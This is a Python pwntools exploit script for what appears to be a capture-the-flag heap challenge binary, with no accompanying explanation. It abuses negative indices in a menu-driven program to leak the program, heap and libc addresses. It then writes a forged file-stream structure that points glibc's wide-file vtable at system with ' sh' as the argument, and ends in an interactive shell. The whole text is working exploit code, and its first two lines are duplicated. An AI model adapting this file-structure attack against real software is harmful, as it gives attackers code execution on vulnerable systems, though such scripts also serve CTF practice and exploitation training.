#!/usr/bin/env python3
from pwn import *

#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def make(idx, size, data):
    io.sendlineafter(b": ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", str(size).encode())
    io.sendlineafter(b": ", data)

def delete(idx):
    io.sendlineafter(b": ", b"2")
    io.sendlineafter(b": ", str(idx).encode())

def view(idx):
    io.sendlineafter(b": ", b"3")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"data: ")

gdbscript = '''
set resolve-heap-via-heuristic force
b main
c
b _IO_wfile_seekoff
c
'''.format(**locals())

io = start()

view(-7)
exe.address = u64(io.recvline().strip()[0:6].ljust(8, b'\x00'))-0x4008

make(0, 0x400, b'A'*8)
make(1, 0x18, b'A'*8)

delete(0)

make(0, 0x100, b'A'*0xf)
view(0)
io.recvline()
heap_base = u64(io.recvline()[0:6].ljust(8, b'\x00')) - 0x1010

make(0, 0x100, b'')
view(0)
io.recvline()
libc.address = u64(b'\x20' + io.recvline().strip()[0:6].ljust(7, b'\x00')) - 0x234b20

w_offset = 0xE0
fs = flat(
    {
        0x00: b' sh'.ljust(8, b'\x00'),
        0xA0: p64(heap_base+0x14e0+0xe0),
        0xC0: p32(-1, sign="signed"),
        0xD8: libc.sym['_IO_wfile_jumps'] - 0x38 + 0x18,
        w_offset+0xE0: p64(heap_base+0x14e0+0xe0),
        w_offset+0x68: p64(libc.sym['system'])
    },
    filler=b'\x00'
)

make(-4, 0x1e0, fs)
# heap_base+0x14e0

io.interactive()
